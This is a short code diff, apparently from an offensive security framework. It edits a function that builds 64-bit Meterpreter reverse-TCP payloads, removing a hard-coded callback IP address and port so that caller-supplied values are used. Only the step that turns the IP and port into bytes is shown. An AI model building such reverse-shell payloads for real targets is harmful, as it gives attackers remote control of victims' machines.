@@ -59,9 +59,6 @@ class MeterpreterCommand(CommandBase):
 
 
 def build_meterpreter_reverse_tcp_64(IP, port):
-    IP = "54.187.110.244"
-    port = 80
-
     hex_ip = bytearray.fromhex(("".join(format(int(octet), "02x") for octet in IP.split("."))))
     hex_port = port.to_bytes(2, 'big')
 
